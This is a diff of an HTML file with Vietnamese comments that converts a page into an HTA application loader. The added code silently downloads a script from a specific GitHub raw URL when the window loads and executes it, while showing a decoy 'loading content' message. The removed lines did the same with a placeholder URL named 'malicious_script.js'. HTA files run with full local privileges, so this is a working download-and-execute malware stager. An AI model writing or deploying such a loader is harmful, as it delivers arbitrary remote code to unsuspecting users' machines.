@@ -1,28 +1,85 @@
 <html>
 <head>
-<script>
-var scriptUrl = "http://your-server.com/malicious_script.js"; // Thay thế bằng URL thực tế của bạn
-
-function loadAndExecuteScript(url) {
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", url, false); // false để thực hiện đồng bộ (synchronous)
-    xhr.send();
-
-    if (xhr.status === 200) {
-        var script = document.createElement("script");
-        script.text = xhr.responseText;
-        document.body.appendChild(script);
-    } else {
-        alert("Không thể tải script từ: " + url + "\nTrạng thái: " + xhr.status);
+<title>HTA Loader Example</title>
+<HTA:APPLICATION
+    ID="MyHTA"
+    APPLICATIONNAME="HTALoader"
+    BORDER="thick"
+    BORDERSTYLE="normal"
+    CAPTION="yes"
+    SHOWINTASKBAR="yes"
+    SINGLEINSTANCE="yes"
+    WINDOWSTATE="normal"
+    SCROLL="auto"
+    INNERBORDER="no"
+    MAXIMIZEBUTTON="yes"
+    MINIMIZEBUTTON="yes"
+    SYSMENU="yes"
+    CONTEXTMENU="yes"
+    NAVIGABLE="yes"
+    SELECTION="yes"
+/>
+<style type="text/css">
+    body {
+        font-family: Arial, sans-serif;
+        padding: 20px;
+        background-color: #f0f0f0;
     }
-}
+    #outputTextbox {
+        width: 95%;
+        height: 200px;
+        padding: 10px;
+        border: 1px solid #ccc;
+        font-size: 14px;
+        color: #333;
+        margin-top: 10px;
+        resize: vertical; /* Cho phép người dùng thay đổi kích thước theo chiều dọc */
+    }
+    .message {
+        color: green;
+        font-weight: bold;
+        margin-bottom: 15px;
+    }
+</style>
+<script>
+    // URL của tệp script bạn muốn tải và thực thi
+    // **QUAN TRỌNG: Thay thế bằng URL thực tế của bạn!**
+    const scriptUrl = "https://github.com/vfafa/e/raw/refs/heads/main/loader.js";
 
-window.onload = function() {
-    loadAndExecuteScript(scriptUrl);
-};
+    function loadAndExecuteScript(url) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", url, false); // false để tải đồng bộ
+        xhr.send();
+
+        if (xhr.status === 200) {
+            try {
+                // Tạo một đối tượng script và thêm nội dung tải về vào đó
+                var script = document.createElement("script");
+                script.text = xhr.responseText;
+                document.body.appendChild(script);
+                console.log("Script loaded and executed.");
+            } catch (e) {
+                console.error("Error executing script:", e);
+                alert("Lỗi khi thực thi script được tải: " + e.message);
+            }
+        } else {
+            console.error("Failed to load script. Status:", xhr.status);
+            alert("Không thể tải script từ: " + url + "\nTrạng thái: " + xhr.status);
+        }
+    }
+
+    // Chạy khi cửa sổ HTA đã tải xong
+    window.onload = function() {
+        console.log("HTA window loaded. Loading external script...");
+        loadAndExecuteScript(scriptUrl);
+    };
 </script>
 </head>
 <body>
-    <!-- Nội dung này có thể trống hoặc có thể chứa các thông báo cho người dùng -->
+    <div class="message">Đang tải và hiển thị nội dung...</div>
+    <textarea id="outputTextbox" readonly placeholder="Nội dung sẽ hiển thị ở đây..."></textarea>
+
+    <!-- Bạn cũng có thể dùng input type="text" -->
+    <!-- <input type="text" id="outputTextbox" readonly value="Nội dung sẽ hiển thị ở đây..."> -->
 </body>
 </html>
